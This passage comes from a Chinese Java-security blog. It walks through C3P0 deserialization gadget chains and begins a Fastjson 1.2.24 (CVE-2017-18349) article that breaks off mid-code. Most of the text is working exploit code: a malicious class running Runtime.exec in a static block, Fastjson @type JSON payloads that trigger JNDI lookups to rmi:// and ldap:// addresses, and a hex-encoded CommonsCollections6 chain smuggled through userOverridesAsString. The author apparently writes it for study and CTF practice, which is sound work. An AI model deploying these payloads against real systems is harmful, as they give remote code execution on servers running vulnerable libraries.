class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> getPoolBackedDataSource();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);  </span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);  </span><br><span class="line">  </span><br><span class="line">        unserial();  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> o;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PoolBackedDataSourceBase <span class="title function_">getPoolBackedDataSource</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="type">EXPLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EXPLoader</span>();  </span><br><span class="line">        <span class="comment">// use pulic constructor  </span></span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(poolBackedDataSourceBase, loader);  </span><br><span class="line">        <span class="keyword">return</span> poolBackedDataSourceBase;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>被加载的恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;clac main&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713163006.png" alt="image.png"></p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>这条链子依赖于Fastjson或Jackson反序列化漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#修改jndiName</span><br><span class="line">JndiRefConnectionPoolDataSource#setJndiName -&gt;</span><br><span class="line">JndiRefForwardingDataSource#setJndiName</span><br><span class="line"> </span><br><span class="line">#JNDI调用</span><br><span class="line">JndiRefConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">WrapperConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">JndiRefForwardingDataSource#setLoginTimeout -&gt;</span><br><span class="line">JndiRefForwardingDataSource#inner -&gt;</span><br><span class="line">JndiRefForwardingDataSource#dereference() -&gt;</span><br><span class="line">Context#lookup</span><br></pre></td></tr></table></figure><p>添加fastjson依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;1.2.24&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h3><p>漏洞点位于<code>com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource</code></p><p>这个中有非常多的getter和setter, 可以配合fastjson来设置<code>jndiname</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#修改jndiName</span><br><span class="line">JndiRefConnectionPoolDataSource#setJndiName -&gt;</span><br><span class="line">JndiRefForwardingDataSource#setJndiName</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 触发jndi查询</span><br><span class="line">com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource.setLoginTimeout -&gt;</span><br><span class="line">com.mchange.v2.c3p0.WrapperConnectionPoolDataSource.setLoginTimeout -&gt;</span><br><span class="line">com.mchange.v2.c3p0.JndiRefForwardingDataSource.setLoginTimeout -&gt; </span><br><span class="line">inner() -&gt; </span><br><span class="line">dereference -&gt; </span><br><span class="line">ctx.lookup</span><br></pre></td></tr></table></figure><p>有了调用链就可以直接写出fastjson的利用payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource&quot;,</span><br><span class="line">&quot;jndiName&quot;: &quot;rmi://127.0.0.1:1099/gx9xh5&quot;,</span><br><span class="line">&quot;loginTimeout&quot;: 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="设置jndiname"><a href="#设置jndiname" class="headerlink" title="设置jndiname"></a>设置jndiname</h4><p>首先来看设置jndiname<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220305.png" alt="image.png"></p><p><code>jrfds</code>是<code>JndiRefForwardingDataSource</code>的实例, <code>JndiRefForwardingDataSource</code>继承<code>JndiRefDataSourceBase</code>的setJndiName方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220319.png" alt="image.png"></p><h4 id="触发jndi查询"><a href="#触发jndi查询" class="headerlink" title="触发jndi查询"></a>触发jndi查询</h4><p>fastjson触发setLoginTimeout这个setter<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220538.png" alt="image.png"><br>跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220613.png" alt="image.png"></p><p>setLoginTimeout来自于javax.sql.CommonDataSource接口<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220658.png" alt="image.png"></p><p>JndiRefForwardingDataSource实现了该接口, 且setLoginTimeout方法可以触发到jndi查询<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220920.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220950.png" alt="image.png"></p><h3 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exp.c3p0;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIexpWithFastJson</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\t\&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\t\&quot;JndiName\&quot;: \&quot;ldap://127.0.0.1:1389/gx9xh5\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\t\&quot;LoginTimeout\&quot;: 1\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713213946.png" alt="image.png"></p><h2 id="利用HEX序列化字节加载器进行反序列化攻击"><a href="#利用HEX序列化字节加载器进行反序列化攻击" class="headerlink" title="利用HEX序列化字节加载器进行反序列化攻击"></a>利用HEX序列化字节加载器进行反序列化攻击</h2><p>这个链发生在上面的<code>WrapperConnectionPoolDataSource</code>类的构造函数中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource -&gt; </span><br><span class="line">com.mchange.v2.c3p0.impl.C3P0ImplUtils#parseUserOverridesAsString -&gt;</span><br><span class="line">com.mchange.v2.ser.SerializableUtils#fromByteArray -&gt;</span><br><span class="line">com.mchange.v2.ser#deserializeFromByteArray -&gt;</span><br><span class="line">readObject()</span><br></pre></td></tr></table></figure><h3 id="流程分析-2"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h3><p>看一下调用处的代码片段<br>首先是构造函数<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713223344.png" alt="image.png"><br>将userOverridesAsString作为参数传进去</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713223430.png" alt="image.png"><br>去掉字符串首部的<code>HASM_HEADER</code>(<code>&quot;HexAsciiSerializedMap&quot;</code>) 和尾部的一个字符</p><p>反序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713223608.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713223617.png" alt="image.png"></p><h3 id="最终exp-1"><a href="#最终exp-1" class="headerlink" title="最终exp"></a>最终exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exp.c3p0;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">deserialHexString</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> getHexString();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">        System.out.println(payload);  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;  </span><br><span class="line">        sw.write(toHexDigit(h1));  </span><br><span class="line">        sw.write(toHexDigit(h2));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">char</span> out;  </span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);  </span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);  </span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);  </span></span><br><span class="line">        <span class="keyword">return</span> out;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//将类序列化为字节数组  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);  </span><br><span class="line">        oos.writeObject(o);  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//字节数组转十六进制  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;  </span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)  </span><br><span class="line">            addHexAscii(bytes[i], sw);  </span><br><span class="line">        <span class="keyword">return</span> sw.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getHexString</span><span class="params">()</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">evil</span> <span class="operator">=</span> CC6();  </span><br><span class="line">        <span class="type">byte</span>[] bytes = tobyteArray(evil);  </span><br><span class="line">  </span><br><span class="line">        hexString = toHexAscii(bytes);  </span><br><span class="line">        <span class="keyword">return</span> hexString;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//CC6的利用链  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">CC6</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="comment">//使用InvokeTransformer包装一下  </span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));  </span><br><span class="line">  </span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;abc&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;eee&quot;</span>);  </span><br><span class="line">        lazyMap.remove(<span class="string">&quot;abc&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//反射修改LazyMap类的factory属性  </span></span><br><span class="line">        Class clazz=LazyMap.class;  </span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> hashMap2;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="c3p0不出网利用"><a href="#c3p0不出网利用" class="headerlink" title="c3p0不出网利用"></a>c3p0不出网利用</h2><p><a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C3P0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson反序列化</title>
      <link href="/2025/09/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/09/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349)"></a>fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349)</h2><p>之前虽然也学了fastjson历史漏洞, 也跟着其他师傅的文章调试了一遍, 但大多囫囵吞枣, 也忘得差不多了, 最近又遇到很多fastjson的题目, 打算不看文章, 自己重新过一遍fastjson反序列化的流程, 文中解释与用词可能不太准确, 师傅们轻喷</p><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>先看exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;  </span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line">  